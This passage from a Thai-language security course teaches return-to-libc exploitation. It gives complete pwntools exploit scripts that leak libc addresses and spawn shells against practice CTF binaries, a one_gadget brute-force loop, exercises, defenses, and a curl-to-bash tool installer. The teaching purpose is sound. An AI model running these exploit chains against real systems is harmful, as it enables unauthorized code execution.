    leaked_bytes = p.recvline().strip()
    # pad ด้วย null bytes ให้ครบ 8 bytes
    leaked_bytes = leaked_bytes.ljust(8, b'\x00')
    return u64(leaked_bytes)
```

---

## 11. Libc Database

### 11.1 ทำไมต้องใช้ Libc Database

ในการ CTF เราได้ leaked address แต่ไม่รู้ว่าเป็น libc version ไหน!

```
เรารู้: puts อยู่ที่ 0x7f...8e50 (3 bytes สุดท้าย = 0xe50)
ไม่รู้: libc version ไหน?
         Ubuntu 20.04? 18.04? Custom libc?
```

### 11.2 libc-database

```bash
# Clone libc-database
git clone https://github.com/niklasb/libc-database
cd libc-database

# Download libc versions ทั่วไป
./get ubuntu
./get debian
./get centos

# ค้นหาด้วย symbol+offset
./find puts e50   # ค้นหา libc ที่มี puts ที่ offset สิ้นสุดด้วย e50

# ผลลัพธ์:
# ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu11.3_amd64)
# puts = 0x6f690
# ...
```

### 11.3 Online Tools

```
# เว็บที่มีประโยชน์:
https://libc.blukat.me/       - Libc Database Search
https://libc.rip/             - Another libc database
https://github.com/niklasb/libc-database - offline tool
```

### 11.4 ใช้งาน libc.rip API

```python
#!/usr/bin/env python3
import requests

# Leaked addresses
leaked = {
    'puts': hex(0x7f8b2c06f690),  # ใช้ offset 3 bytes สุดท้าย
}

# ค้นหา libc
response = requests.post('https://libc.rip/api/find', json={
    'symbols': {
        'puts': hex(leaked['puts'] & 0xfff),  # 3 bytes สุดท้าย
    }
})

results = response.json()
for lib in results:
    print(f"Libc: {lib['id']}")
    print(f"  puts offset: {lib['symbols']['puts']}")
```

### 11.5 ใช้ pwntools libc-database

```python
from pwn import *

# ใช้ LibcSearcher (ถ้าติดตั้ง)
# pip install LibcSearcher
from LibcSearcher import *

# Leak address
leaked_puts = 0x7f8b2c06f690

# ค้นหา libc
obj = LibcSearcher("puts", leaked_puts)
libc_base = leaked_puts - obj.dump("puts")
system_addr = libc_base + obj.dump("system")
binsh_addr = libc_base + obj.dump("str_bin_sh")
```

---

## 12. one_gadget

### 12.1 one_gadget คืออะไร

**one_gadget** คือ single gadget ใน libc ที่เมื่อ jump ไปแล้วจะได้ shell เลย โดยไม่ต้องตั้งค่า arguments!

```
ปกติ:
  pop rdi; ret → &"/bin/sh" → system()   (3 steps)

one_gadget:
  jump to one_gadget_address              (1 step!)
```

### 12.2 ติดตั้งและใช้ one_gadget

```bash
# ติดตั้ง
gem install one_gadget

# ค้นหา one_gadgets ใน libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# ผลลัพธ์ตัวอย่าง:
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
```

### 12.3 Constraints ของ one_gadget

แต่ละ one_gadget มี **constraints** - เงื่อนไขที่ต้องเป็นจริงก่อน gadget จะทำงาน:

```
Constraint: [r15] == NULL
แปลว่า: register r15 ต้องเป็น 0 หรือชี้ไปที่ memory ที่มีค่า NULL
```

```bash
# ตรวจสอบ constraints ด้วย gdb
(gdb) break *0x7f8b2c000000+0xe3afe
(gdb) r
# ตรวจสอบ registers:
(gdb) p $r15
(gdb) p $rdx
```

### 12.4 ใช้ one_gadget ใน Exploit

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./vuln64')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

# หลังจาก leak libc base แล้ว
libc_base = # calculated from leak

# one_gadget offsets (จาก one_gadget command)
one_gadgets = [
    0xe3afe,  # constraints: r15==NULL, r12==NULL
    0xe3b01,  # constraints: r15==NULL, rdx==NULL
    0xe3b04,  # constraints: rsi==NULL, rdx==NULL
]

# ลอง one_gadget แรกก่อน
one_gadget_addr = libc_base + one_gadgets[0]

# payload เรียบง่ายมาก!
payload = flat(
    b'A' * offset,
    p64(one_gadget_addr),   # แค่ jump ที่นี่เดียว!
)
```

### 12.5 เมื่อ one_gadget ไม่ทำงาน

```python
# ลอง one_gadget หลายๆ อัน
for og in one_gadgets:
    og_addr = libc_base + og
    try:
        p = process('./vuln64')
        # ... leak stage ...
        payload = flat(b'A' * offset, p64(og_addr))
        p.sendline(payload)
        p.sendline(b'id')  # ทดสอบว่าได้ shell จริงๆ
        result = p.recvline(timeout=1)
        if b'uid' in result:
            print(f"[+] one_gadget {hex(og)} worked!")
            p.interactive()
            break
    except:
        print(f"[-] one_gadget {hex(og)} failed")
        p.close()
```

---

## 13. Environment Variable Approach (32-bit)

### 13.1 แนวคิด

ในบางกรณี (โดยเฉพาะ 32-bit) เราสามารถวาง "/bin/sh" ใน environment variable แล้วหา address ของมันใน stack ได้

### 13.2 ตำแหน่งของ Environment Variables ใน Stack

```
Stack Layout เมื่อ Program Start:
+------------------+
| env variables    | <-- MYSHELL=/bin/sh อยู่ที่นี่
| argv[]           |
| argc             |
+------------------+
| main()'s frame   |
+------------------+
| ...              |
+------------------+
| vulnerable buffer|
+------------------+
```

### 13.3 หา Address ของ Environment Variable

```c
// getenv_addr.c - helper program หา address ของ env var
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char *ptr;
    if (argc < 3) {
        printf("Usage: %s <env var> <target program>\n", argv[0]);
        exit(0);
    }
    
    ptr = getenv(argv[1]);
    ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;  // adjust for program name length
    printf("%s is at address: %p\n", argv[1], ptr);
    return 0;
}
```

```bash
export SHELLPATH=/bin/sh
./getenv_addr SHELLPATH ./vuln32
# SHELLPATH is at address: 0xffffd8a0
```

### 13.4 Python Script แบบ Cross-Platform

```python
#!/usr/bin/env python3
from pwn import *
import os

# ตั้งค่า environment variable
env = {'SHELLCMD': '/bin/sh'}

# รัน program เพื่อหา address
p = process(['./getenv_addr', 'SHELLCMD', './vuln32'], env=env)
output = p.recvline()
p.close()

# parse address
import re
match = re.search(r'0x[0-9a-f]+', output.decode())
if match:
    shell_addr = int(match.group(), 16)
    print(f"/bin/sh env var @ {hex(shell_addr)}")
```

### 13.5 ข้อจำกัด

- Address อาจเปลี่ยนตาม:
  - ชื่อของ program
  - จำนวน env vars
  - ชื่อของ env vars
- ใช้ได้ดีเมื่อ ASLR ปิด
- ใน 64-bit ASLR ทำให้ approach นี้ยากขึ้นมาก

---

## 14. Return-to-main สำหรับหลาย Pass

### 14.1 ทำไมต้องทำหลาย Pass

บางครั้ง single overflow ไม่พอ เช่น:
1. ต้อง leak address ก่อน (pass 1)
2. ใช้ address ที่ leak มา exploit (pass 2)

เราสามารถ **return กลับ main()** เพื่อ overflow ใหม่ได้!

### 14.2 Stack Layout สำหรับ return-to-main

```
Pass 1 Payload:
+------------------+
| AAAAAAAA...      |  padding
| pop_rdi_gadget   |  →  
| puts_got         |     leak puts address
| puts_plt         |  ←
| main_addr        |  <-- return กลับ main!
+------------------+

Pass 2 Payload (หลังรู้ libc base):
+------------------+
| AAAAAAAA...      |  padding
| pop_rdi_gadget   |
| binsh_addr       |
| system_addr      |  <-- get shell!
+------------------+
```

### 14.3 ตัวอย่าง Multi-Pass Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

offset = 72
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.sym['main']

p = process('./vuln')

# ===== Pass 1: Leak =====
print("[*] Pass 1: Leaking libc...")

# leak puts address จาก GOT
leak_payload = flat(
    b'A' * offset,
    p64(pop_rdi),
    p64(puts_got),
    p64(puts_plt),
    p64(main_addr),     # กลับ main สำหรับ pass 2
)

p.recvuntil(b'input: ')
p.sendline(leak_payload)
p.recvuntil(b'\n')  # รับ output ก่อนหน้า (ถ้ามี)

# รับ leaked address
raw_leak = p.recvline().strip()
puts_leak = u64(raw_leak.ljust(8, b'\x00'))
print(f"[+] puts @ {hex(puts_leak)}")

# คำนวณ libc base
libc_base = puts_leak - libc.sym['puts']
print(f"[+] libc base @ {hex(libc_base)}")

# คำนวณ addresses ที่ต้องการ
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))
print(f"[+] system @ {hex(system)}")
print(f"[+] /bin/sh @ {hex(binsh)}")

# ===== Pass 2: Shell =====
print("[*] Pass 2: Getting shell...")

shell_payload = flat(
    b'A' * offset,
    p64(pop_rdi),
    p64(binsh),
    p64(ret_gadget),    # alignment
    p64(system),
)

p.recvuntil(b'input: ')
p.sendline(shell_payload)

print("[+] Enjoy your shell!")
p.interactive()
```

### 14.4 Return-to-main ใน 32-bit

```python
# 32-bit ง่ายกว่าเล็กน้อย เพราะ args ผ่าน stack
# ไม่ต้องการ ROP gadget สำหรับ args

# Pass 1: leak
leak_payload = flat(
    b'A' * offset,
    p32(puts_plt),      # call puts
    p32(main_addr),     # return to main
    p32(puts_got),      # argument: &puts@got
)
```

---

## 15. pwntools: เครื่องมือสำหรับ Exploitation

### 15.1 ติดตั้ง pwntools

```bash
pip install pwntools

# หรือ
pip3 install pwntools

# อัพเดต
pip3 install --upgrade pwntools
```

### 15.2 process() และ remote()

```python
from pwn import *

# ต่อกับ local process
p = process('./vuln')

# ต่อกับ remote server (CTF)
p = remote('challenge.ctf.io', 1337)

# ต่อกับ local socket
p = remote('localhost', 9999)

# รัน process พร้อม custom environment
p = process('./vuln', env={'LD_PRELOAD': './libc.so.6'})

# รัน process พร้อม stdin จาก file
p = process(['./vuln', 'arg1', 'arg2'])

# กำหนด working directory
p = process('./vuln', cwd='/tmp/')
```

### 15.3 การส่งและรับข้อมูล

```python
from pwn import *

p = process('./vuln')

# ส่งข้อมูล
p.send(b'hello')            # ส่งโดยไม่มี newline
p.sendline(b'hello')        # ส่งพร้อม newline
p.sendafter(b'prompt:', b'data')    # ส่งหลังรับ prompt
p.sendlineafter(b'input: ', b'data')  # sendline หลัง prompt

# รับข้อมูล
data = p.recv(1024)         # รับ bytes
line = p.recvline()         # รับ 1 บรรทัด
p.recvuntil(b'marker')      # รับจนถึง string
p.recvall()                 # รับทั้งหมด

# interactive mode
p.interactive()             # ใช้ terminal มือ

# ปิด connection
p.close()
```

### 15.4 libc.sym[] - Symbols

```python
from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# หา symbol
system_off = libc.sym['system']         # offset ของ system
puts_off = libc.sym['puts']             # offset ของ puts
exit_off = libc.sym['exit']             # offset ของ exit
execve_off = libc.sym['execve']         # offset ของ execve

# หลังรู้ base address
libc.address = 0x7f8b2c000000          # กำหนด base
system_addr = libc.sym['system']        # คำนวณ address อัตโนมัติ!
puts_addr = libc.sym['puts']

# หา string
binsh_off = next(libc.search(b'/bin/sh'))

print(f"system: {hex(libc.sym['system'])}")
print(f"/bin/sh: {hex(next(libc.search(b'/bin/sh')))}")
```

### 15.5 p64() และ p32() - Packing

```python
from pwn import *

# p64(): pack integer เป็น 8 bytes (little-endian)
packed = p64(0x7f8b2c048e50)
# b'\x50\x8e\x04\x2c\x8b\x7f\x00\x00'

# p32(): pack integer เป็น 4 bytes (little-endian)
packed32 = p32(0xf7e04850)
# b'\x50\x48\xe0\xf7'

# u64(): unpack 8 bytes → integer
raw = b'\x50\x8e\x04\x2c\x8b\x7f\x00\x00'
value = u64(raw)
# 0x7f8b2c048e50

# u32(): unpack 4 bytes → integer
raw32 = b'\x50\x48\xe0\xf7'
value32 = u32(raw32)
# 0xf7e04850

# สำหรับ big-endian
p64_be = p64(0x1234, endian='big')
```

### 15.6 ELF Class

```python
from pwn import *

elf = ELF('./vuln')

# ข้อมูลพื้นฐาน
print(elf.arch)         # 'amd64' หรือ 'i386'
print(elf.bits)         # 64 หรือ 32
print(hex(elf.address)) # base address (0x400000 ถ้า no PIE)

# Symbols
print(hex(elf.sym['main']))     # address ของ main
print(hex(elf.sym['printf']))   # address ของ printf

# PLT/GOT
print(hex(elf.plt['puts']))     # puts@plt
print(hex(elf.got['puts']))     # puts@got

# Sections
print(hex(elf.bss()))           # BSS address
print(elf.checksec())           # security features

# ค้นหา strings
for addr in elf.search(b'/bin/sh'):
    print(hex(addr))
```

### 15.7 ROP Class

```python
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# หา gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# ใช้ ROP object สร้าง chain อัตโนมัติ
rop.call(elf.sym['puts'], [elf.got['puts']])  # puts(got['puts'])
rop.call(elf.sym['main'])                      # กลับ main

# dump chain
print(rop.dump())

# ได้ bytes ของ chain
chain = bytes(rop)
```

### 15.8 context Settings

```python
from pwn import *

# กำหนด architecture
context.arch = 'amd64'      # หรือ 'i386', 'arm', 'mips'
context.os = 'linux'
context.bits = 64

# log level
context.log_level = 'debug'  # แสดงทุกอย่าง
context.log_level = 'info'   # ข้อมูลสำคัญ
context.log_level = 'error'  # error เท่านั้น

# อ่านจาก binary
context.binary = './vuln'  # กำหนด arch จาก binary อัตโนมัติ
```

### 15.9 flat() - สร้าง Payload

```python
from pwn import *

context.arch = 'amd64'

# flat() จัด pack อัตโนมัติตาม architecture
payload = flat(
    b'A' * 72,          # bytes ปกติ
    0x4006f3,           # integer → p64() อัตโนมัติ
    0x7f1234567890,     # integer → p64() อัตโนมัติ
)

# เทียบกับ manual:
payload_manual = (
    b'A' * 72 +
    p64(0x4006f3) +
    p64(0x7f1234567890)
)
# ได้ผลเหมือนกัน
```

### 15.10 Debug ด้วย gdb

```python
from pwn import *

p = process('./vuln')

# attach gdb
gdb.attach(p, gdbscript='''
break main
break *vulnerable_function+50
continue
''')

p.sendline(b'test payload')
p.interactive()
```

---

## 16. ตัวอย่าง CTF แบบสมบูรณ์

### 16.1 โจทย์ตัวอย่าง: "Baby Ret2libc"

**ข้อมูลโจทย์**: Binary ที่ให้มา `baby_ret2libc` รันบน remote server
- No PIE
- NX enabled
- No canary
- ASLR enabled (ระดับ OS)

```c
// ซอร์สโค้ดของโจทย์ (decompiled):
#include <stdio.h>
#include <stdlib.h>

int main() {
    char buf[64];
    puts("Welcome to ret2libc challenge!");
    puts("Enter your name: ");
    gets(buf);  // vulnerable!
    printf("Hello, %s!\n", buf);
    return 0;
}
```

### 16.2 Analysis

```bash
# ตรวจสอบ binary
file baby_ret2libc
# baby_ret2libc: ELF 64-bit LSB executable, x86-64, dynamically linked

checksec --file=baby_ret2libc
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# ดู functions ที่มี
objdump -d baby_ret2libc | grep "<.*@plt>:"
# 0000000000401020 <puts@plt>:
# 0000000000401030 <printf@plt>:
# 0000000000401040 <gets@plt>:

# ดู GOT
objdump -R baby_ret2libc
# 0000000000404018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
# 0000000000404020 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
```

### 16.3 หา Offset

```bash
# ใน gdb
gdb -q baby_ret2libc
(gdb) r <<< $(python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(200))")

# Program received signal SIGSEGV
# RIP = 0x6161616161616168

python3 -c "from pwn import *; print(cyclic_find(0x6161616161616168))"
# 72
```

### 16.4 หา Gadgets

```bash
ROPgadget --binary baby_ret2libc | grep "pop rdi"
# 0x00000000004012f3 : pop rdi ; ret

ROPgadget --binary baby_ret2libc | grep ": ret$"
# 0x000000000040101a : ret
```

### 16.5 Full Exploit

```python
#!/usr/bin/env python3
# solve_baby_ret2libc.py
from pwn import *

# ตั้งค่า
context.arch = 'amd64'
context.log_level = 'info'

HOST = 'challenge.ctf.io'
PORT = 1337

# libc ที่ใช้บน server (ต้องหาจากการ leak)
# สมมติว่าเป็น libc-2.31 Ubuntu 20.04
libc = ELF('./libc-2.31.so')  # download จาก server หรือ libc.rip

# โหลด binary
elf = ELF('./baby_ret2libc')

# Addresses (no PIE)
puts_plt = elf.plt['puts']      # 0x401020
puts_got = elf.got['puts']      # 0x404018
main_addr = elf.sym['main']     # 0x401176 (ตัวอย่าง)

pop_rdi = 0x4012f3              # pop rdi; ret
ret = 0x40101a                  # ret (สำหรับ alignment)

print(f"puts@plt = {hex(puts_plt)}")
print(f"puts@got = {hex(puts_got)}")
print(f"main     = {hex(main_addr)}")
print(f"pop rdi  = {hex(pop_rdi)}")

OFFSET = 72

def stage1_leak(p):
    """Stage 1: Leak puts address จาก GOT"""
    
    payload = flat(
        b'A' * OFFSET,
        p64(pop_rdi),
        p64(puts_got),      # argument: &puts@got
        p64(puts_plt),      # call puts → prints puts's libc addr
        p64(main_addr),     # return to main
    )
    
    p.recvuntil(b'Enter your name: \n')
    p.sendline(payload)
    p.recvuntil(b'Hello, ')
    p.recvuntil(b'!\n')  # skip "Hello, AAAA...!\n"
    
    # รับ leaked puts address
    leaked = p.recvline().strip()
    puts_addr = u64(leaked.ljust(8, b'\x00'))
    log.success(f"Leaked puts @ {hex(puts_addr)}")
    return puts_addr

def stage2_shell(p, puts_addr):
    """Stage 2: Get shell ด้วย system("/bin/sh")"""
    
    # คำนวณ libc base
    libc_base = puts_addr - libc.sym['puts']
    log.success(f"libc base @ {hex(libc_base)}")
    
    # addresses ที่ต้องการ
    system_addr = libc_base + libc.sym['system']
    binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
    
    log.info(f"system @ {hex(system_addr)}")
    log.info(f"/bin/sh @ {hex(binsh_addr)}")
    
    payload = flat(
        b'A' * OFFSET,
        p64(pop_rdi),
        p64(binsh_addr),
        p64(ret),           # stack alignment
        p64(system_addr),
    )
    
    p.recvuntil(b'Enter your name: \n')
    p.sendline(payload)

def pwn():
    # LOCAL = True สำหรับ test, False สำหรับ remote
    LOCAL = False
    
    if LOCAL:
        p = process('./baby_ret2libc',
                   env={'LD_PRELOAD': './libc-2.31.so'})
    else:
        p = remote(HOST, PORT)
    
    # Stage 1
    puts_addr = stage1_leak(p)
    
    # Stage 2
    stage2_shell(p, puts_addr)
    
    log.success("Got shell! Enjoy!")
    p.interactive()

if __name__ == '__main__':
    pwn()
```

### 16.6 โจทย์ตัวอย่างที่ 2: "Advanced ret2libc" (PIE)

```c
// advanced_ret2libc.c
// compiled with PIE enabled
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void secret() {
    puts("This is never called!");
}

void vuln() {
    char buf[32];
    printf("Your input: ");
    fflush(stdout);
    read(0, buf, 256);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

```bash
checksec advanced_ret2libc
# PIE: PIE enabled   <-- ทุกอย่าง random!
```

```python
#!/usr/bin/env python3
# solve_advanced.py - PIE enabled
from pwn import *

context.arch = 'amd64'

elf = ELF('./advanced_ret2libc')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

OFFSET = 40  # buffer(32) + rbp(8)

def exploit():
    p = process('./advanced_ret2libc')
    
    # PIE เปิด: ต้อง leak binary base ก่อน!
    # วิธีหนึ่งคือ format string หรือใช้ partial overwrite
    
    # ในตัวอย่างนี้ สมมติว่าเรา leak ได้แล้ว
    # (ใน real CTF อาจต้องใช้ format string bug หรือ other leak)
    
    # หลัง leak binary base:
    elf.address = 0x555555400000  # ตัวอย่าง (ต้อง leak จริง)
    
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    
    # ... same as before แต่ใช้ addresses ที่คำนวณจาก leaked base
    pass

exploit()
```

---

## 17. การป้องกัน (Defense)

### 17.1 RELRO (Relocation Read-Only)

```bash
checksec --file=vuln
# RELRO:    Full RELRO   <-- GOT ถูก map เป็น read-only หลัง init

# Full RELRO: ป้องกันการเขียน GOT
# Partial RELRO: บาง GOT entries ยังเขียนได้
# No RELRO: ไม่มีการป้องกัน
```

**Full RELRO** ทำให้ GOT overwrite ไม่ได้ แต่ยังไม่ป้องกัน ret2libc ได้ทั้งหมด

### 17.2 Stack Canaries

```bash
# เปิด stack canary
gcc -fstack-protector-all -o secure vuln.c

# ปิด
gcc -fno-stack-protector -o vuln vuln.c

# canary: ค่า random วางอยู่ระหว่าง local vars และ saved RBP
# ถ้า overflow เขียนทับ canary → detected → crash ก่อน return
```

### 17.3 PIE (Position Independent Executable)

```bash
gcc -fpie -pie -o secure vuln.c
# ทำให้ binary address เป็น random
```

### 17.4 Control Flow Integrity (CFI)

เทคโนโลยีสมัยใหม่ที่ป้องกัน indirect jumps/calls ที่ไม่ถูกต้อง:
```bash
# Clang CFI
clang -fsanitize=cfi -flto -fvisibility=hidden -o secure vuln.c
```

### 17.5 Safe Coding Practices

```c
// อย่าใช้ gets() → ใช้ fgets() แทน
fgets(buffer, sizeof(buffer), stdin);  // ปลอดภัย

// อย่าใช้ strcpy() → ใช้ strncpy() แทน
strncpy(dst, src, sizeof(dst) - 1);

// ตรวจสอบ size เสมอ
if (size > sizeof(buffer)) {
    // handle error
    return;
}
read(fd, buffer, sizeof(buffer));  // safe

// ใช้ snprintf แทน sprintf
snprintf(dst, sizeof(dst), "%s", src);
```

### 17.6 Address Sanitizer

```bash
# Compile ด้วย Address Sanitizer สำหรับ detect bugs ระหว่าง development
gcc -fsanitize=address -o debug vuln.c
./debug

# ASAN จะ detect buffer overflows และ report ทันที
```

---

## 18. แบบฝึกหัดและโจทย์

### 18.1 โจทย์ Level 1: Basic ret2libc (ไม่มี ASLR)

```c
// level1.c - compile: gcc -m32 -fno-stack-protector -no-pie -o level1 level1.c
#include <stdio.h>
#include <string.h>

void win() {
    printf("ถ้าคุณเห็นนี่ แสดงว่า got control of execution!\n");
}

void vuln() {
    char buf[48];
    printf("Input: ");
    gets(buf);
}

int main() {
    vuln();
    return 0;
}
```

**คำถาม**:
1. หา offset ของ return address
2. หา address ของ system() และ "/bin/sh"
3. เขียน exploit สำหรับ 32-bit ret2libc

### 18.2 โจทย์ Level 2: ret2libc + ASLR Bypass

```c
// level2.c - compile: gcc -fno-stack-protector -no-pie -o level2 level2.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char buf[64];
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("Hello! Tell me something: ");
    read(0, buf, 256);
    printf("You said: ");
    printf(buf);  // format string bug bonus!
    printf("\n");
    printf("Anything else? ");
    read(0, buf, 256);  // second overflow
    return 0;
}
```

**คำถาม**:
1. ใช้ format string เพื่อ leak libc address
2. ใช้ second overflow เพื่อ exploit
3. เปรียบเทียบกับ ret2plt approach

### 18.3 โจทย์ Level 3: 64-bit + PIE

```c
// level3.c - compile: gcc -fno-stack-protector -pie -fpie -o level3 level3.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// hidden hint!
void helper() {
    puts("I'm a helper function!");
}

void vuln() {
    char name[64];
    printf("What's your name? ");
    fflush(stdout);
    read(0, name, 256);
    printf("Hello, ");
    printf(name);  // format string!
    printf("!\n");
    fflush(stdout);
    
    printf("Tell me more: ");
    fflush(stdout);
    read(0, name, 256);  // overflow
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

**คำถาม**:
1. ใช้ format string leak binary base address (PIE)
2. ใช้ format string leak libc address
3. Setup ret2libc chain

### 18.4 Solution Template

```python
#!/usr/bin/env python3
# template.py
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('./TARGET')
libc = ELF('./libc.so.6')  # หาจาก server หรือ LD_PRELOAD

def exploit():
    # LOCAL testing
    p = process('./TARGET', env={'LD_PRELOAD': './libc.so.6'})
    # REMOTE
    # p = remote('HOST', PORT)
    
    # TODO: หา offset
    offset = 0
    
    # TODO: stage 1 - leak
    leaked_addr = 0
    
    # TODO: คำนวณ bases
    libc_base = leaked_addr - libc.sym['SYMBOL']
    
    # TODO: stage 2 - exploit
    
    p.interactive()

exploit()
```

### 18.5 Hints และ Tips

**Tips สำหรับ CTF**:
```
1. ใช้ checksec ก่อนเสมอเพื่อรู้ว่าต้อง bypass อะไรบ้าง
2. ใช้ cyclic pattern หา offset แทนการนับ manual
3. ตรวจสอบ stack alignment (64-bit)
4. ลอง one_gadget เมื่อทำได้
5. ถ้า gets leak แล้วผิด ตรวจสอบ null bytes
6. ใช้ context.log_level = 'debug' เมื่อ debug
7. pwn debugging: p.recvall() ดู error messages
8. ถ้า remote แต่ไม่รู้ libc version ให้ leak 2-3 functions แล้วค้นหาใน libc.rip
```

**Common Mistakes**:
```
1. ลืม stack alignment (ทำให้ system() crash)
2. offset ผิด (ลอง offset±8)
3. libc base ผิด (ตรวจสอบ last 3 nibbles)
4. ส่ง payload ก่อน recvuntil (race condition)
5. ลืม strip() ค่า leaked bytes
```

---

## Appendix A: Quick Reference

### A.1 pwntools Cheatsheet

```python
from pwn import *

# Setup
context.arch = 'amd64'
context.binary = './binary'
elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Connections
p = process('./binary')
p = remote('host', port)

# Send/Receive
p.send(payload)
p.sendline(payload)
p.sendlineafter(b'prompt', payload)
data = p.recv(n)
data = p.recvline()
data = p.recvuntil(b'marker')
p.interactive()

# Pack/Unpack
p64(addr)           # 8 bytes little-endian
p32(addr)           # 4 bytes little-endian
u64(bytes)          # bytes → integer (8 bytes)
u32(bytes)          # bytes → integer (4 bytes)

# ELF
elf.sym['main']     # address
elf.plt['puts']     # PLT entry
elf.got['puts']     # GOT entry
elf.bss()           # BSS address

# ROP
rop.find_gadget(['pop rdi', 'ret'])[0]
rop.call('puts', [elf.got['puts']])
bytes(rop)          # ได้ bytes

# Misc
cyclic(200)         # pattern
cyclic_find(0x1234) # หา offset
flat(...)           # สร้าง payload
```

### A.2 GDB Commands ที่ใช้บ่อย

```bash
# ใน gdb
r < <(python3 -c "...")   # run with stdin
r <<< $(python3 -c "...")  # run with here-string
b *0x401234               # breakpoint ที่ address
b main                    # breakpoint ที่ function
c                         # continue
n                         # next instruction (step over)
si                        # step instruction (step into)
x/20gx $rsp              # dump 20 qwords จาก RSP
p $rip                   # print RIP
p system                 # print system address
i func                   # list functions
info registers           # dump registers
vmmap                    # (pwndbg) memory map
heap                     # (pwndbg) heap info
```

### A.3 เครื่องมือ Reverse Engineering

```bash
# Disassembler
objdump -d ./binary
# หรือ
gdb-peda/pwndbg/gef
# หรือ Ghidra (GUI)

# Static Analysis
strings ./binary
readelf -a ./binary
nm -D ./binary

# Dynamic Analysis
ltrace ./binary    # library calls
strace ./binary    # system calls

# ROP Tools
ROPgadget --binary ./binary
ropper -f ./binary
one_gadget ./libc.so.6
```

---

## Appendix B: ตัวอย่าง Environment Setup

### B.1 ติดตั้ง Tools

```bash
# pwntools
pip3 install pwntools

# ROPgadget
pip3 install ROPgadget

# ropper
pip3 install ropper

# one_gadget
gem install one_gadget

# pwndbg (gdb plugin)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# checksec
pip3 install checksec  # หรือ
sudo apt install checksec

# gef (gdb plugin - alternative to pwndbg)
bash -c "$(curl -fsSL http://gef.blah.cat/sh)"
```

### B.2 LD_PRELOAD Trick สำหรับ Test

```bash
# ใช้ libc version เฉพาะเมื่อรัน
LD_PRELOAD=/path/to/libc.so.6 ./binary

# ใน pwntools
p = process('./binary', env={'LD_PRELOAD': './libc.so.6'})

# หา libc ที่ตรงกับ server ด้วย Docker
docker run ubuntu:20.04 cat /lib/x86_64-linux-gnu/libc.so.6 > ./libc.so.6
```

### B.3 Docker สำหรับ Simulate Environment

```dockerfile
# Dockerfile
FROM ubuntu:20.04
RUN apt-get update && apt-get install -y \
    gcc \
    gdb \
    python3 \
    python3-pip \
    && pip3 install pwntools
COPY vuln.c /challenge/
WORKDIR /challenge
RUN gcc -fno-stack-protector -no-pie -o vuln vuln.c
CMD ["./vuln"]
```

---

## สรุป / Summary

Return-to-libc เป็นเทคนิคพื้นฐานที่สำคัญมากใน binary exploitation โดยเฉพาะในยุคที่ NX/DEP กลายเป็น default:

**หลักการสำคัญ**:
1. NX ป้องกัน shellcode บน stack แต่ไม่ป้องกัน ret2libc
2. 32-bit: arguments ผ่าน stack → `[system][exit]["/bin/sh"]`
3. 64-bit: argument แรกผ่าน RDI → ต้องใช้ `pop rdi; ret` gadget
4. ASLR bypass ด้วย information leak → leak GOT entry → คำนวณ libc base
5. pwntools ช่วยให้การเขียน exploit สะดวกขึ้นมาก

**Learning Path**:
```
Buffer Overflow → ret2win → ret2libc (32-bit) → ret2libc (64-bit) 
→ ASLR bypass → ret2plt → ROP chains → heap exploitation
```

**Resources สำหรับการเรียนรู้เพิ่มเติม**:
- [pwn.college](https://pwn.college) - interactive challenges
- [exploit.education](https://exploit.education) - VM-based challenges  
- CTF writeups บน CTFtime.org
- LiveOverflow YouTube channel
- pwntools documentation: https://docs.pwntools.com

---

*หมายเหตุ: เนื้อหานี้เป็นส่วนหนึ่งของ Assembly และ Low-Level Security Course*  
*Part 072 / Return-to-libc Attack (Educational)*  
*ใช้สำหรับการศึกษาและ CTF competitions เท่านั้น*
